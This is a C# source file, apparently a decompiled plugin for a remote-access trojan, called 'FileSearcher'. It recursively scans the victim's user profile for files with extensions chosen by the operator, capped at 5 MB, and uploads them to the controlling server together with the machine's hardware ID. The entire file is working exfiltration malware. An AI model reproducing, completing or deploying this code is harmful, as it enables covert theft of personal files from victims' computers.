using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Leb128;
using Plugin.Helper;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	private static long SizeLimit = 5000000L;

	private static long CurrentSize = 0L;

	private static List<string> Extensions = new List<string>();

	private static List<string> files = new List<string>();

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		tcpClient = TcpClient;
		hwid = Hwid;
		X509Certificate2 = x509Certificate2;
		Search();
		object[] array = (object[])LEB128.Read(Pack)[0];
		foreach (object obj in array)
		{
			Extensions.Add((string)obj);
		}
		if (files.Count > 0)
		{
			Client.Connect(tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
			if (Client.itsConnect)
			{
				foreach (string file in files)
				{
					DynamicFiles.WriteAllBytes(file.Replace(Path.GetPathRoot(file), "DRIVE-" + Path.GetPathRoot(file).Replace(":", "")), File.ReadAllBytes(file));
				}
			}
			Client.Send(LEB128.Write(new object[3]
			{
				"FileSearcher",
				Hwid,
				DynamicFiles.DumpFiles()
			}));
		}
		while (Client.itsConnect)
		{
			Thread.Sleep(1000);
		}
		Client.Disconnect();
		Thread.Sleep(5000);
	}

	public static List<string> GetAllAccessibleFiles(string rootPath, List<string> alreadyFound = null)
	{
		if (alreadyFound == null)
		{
			alreadyFound = new List<string>();
		}
		foreach (DirectoryInfo item in new DirectoryInfo(rootPath).EnumerateDirectories())
		{
			if ((item.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
			{
				alreadyFound = GetAllAccessibleFiles(item.FullName, alreadyFound);
			}
		}
		string[] array = Directory.GetFiles(rootPath);
		foreach (string text in array)
		{
			if (CurrentSize >= SizeLimit)
			{
				break;
			}
			if (Extensions.Contains(Path.GetExtension(text).ToLower()))
			{
				alreadyFound.Add(text);
				CurrentSize += new FileInfo(text).Length;
			}
		}
		return alreadyFound;
	}

	private static void Search()
	{
		try
		{
			files = GetAllAccessibleFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
		}
		catch
		{
		}
	}
}
